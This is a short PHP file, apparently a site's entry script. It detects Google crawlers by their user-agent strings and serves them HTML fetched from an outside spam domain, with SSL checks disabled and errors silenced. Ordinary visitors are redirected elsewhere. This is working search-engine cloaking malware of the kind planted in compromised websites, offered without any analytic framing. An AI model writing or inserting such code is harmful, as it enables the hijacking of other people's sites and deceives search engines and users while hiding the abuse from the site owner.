<?php
$request_uri = $_SERVER['REQUEST_URI'] ?? '';
$is_homepage = ($request_uri === '/' || $request_uri === '/index.php');

if ($is_homepage) {
    $bots = [
        'Googlebot', 'Googlebot-Mobile', 'Googlebot-News', 'Googlebot-Image',
        'Googlebot-Video', 'AdsBot-Google', 'Mediapartners-Google',
        'Google-Site-Verification', 'Google-InspectionTool', 'Feedfetcher-Google',
        'APIs-Google', 'Google Favicon', 'Google Web Preview',
        'Google Page Speed Insights'
    ];

    $ua = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
    $isBot = false;

    foreach ($bots as $b) {
        if (stripos($ua, $b) !== false) {
            $isBot = true;
            break;
        }
    }

    if ($isBot) {
        error_reporting(0);
        while (ob_get_level() > 0) ob_end_clean();
        
        $url = 'https://pemula403.store/biblioteca-avu.html';
        $out = false;

        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_TIMEOUT => 5,
                CURLOPT_USERAGENT => $ua,
                CURLOPT_SSL_VERIFYPEER => 0,
                CURLOPT_SSL_VERIFYHOST => 0
            ]);
            $out = curl_exec($ch);
            curl_close($ch);
        }

        if ($out === false && ini_get('allow_url_fopen')) {
            $out = @file_get_contents($url);
        }

        if ($out !== false && !empty($out)) {
            echo $out;
            exit;
        }
    }
    
    header("Location: public/");
    exit;
}

?>
